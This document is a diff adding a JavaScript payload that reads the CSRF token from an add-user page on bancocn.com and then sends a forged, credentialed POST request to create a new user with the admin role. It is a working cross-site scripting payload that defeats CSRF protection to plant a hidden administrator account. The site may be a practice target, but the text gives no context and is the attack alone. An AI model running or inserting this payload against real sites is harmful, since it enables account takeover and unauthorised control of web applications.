@@ -1,0 +1,36 @@
+<script type="text/javascript">
+
+function addUser(token)
+{
+
+	var url="http://bancocn.com/add_user.php";
+	var params="name=Admin&surname=ok&email=ok@gmail.com&role=admin&submit=CSRFToken=" + token;
+
+	var CSRF = new XMLHttpRequest();
+	CSRF.open("POST", url, true);
+	CSRF.withCredentials = 'true';
+	CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+	CSRF.send(params);
+
+}
+
+// Extract the token
+var XHR = new XMLHttpRequest();
+XHR.onreadystatechange = function(){
+
+	if(XHR.readyState == 4){
+		var htmlSource = XHR.responseText; // The source of users.php
+		
+		//Extract the token
+		var parser = new DOMParser().parseFromString(htmlSource, "text/html");
+		var token = parser.getElementById('CSRFToken').value;
+
+		addUser(token);
+	}
+}
+
+XHR.open('GET', 'http://bancocn.com/add_user.php', true);
+XHR.send();
+
+</script>
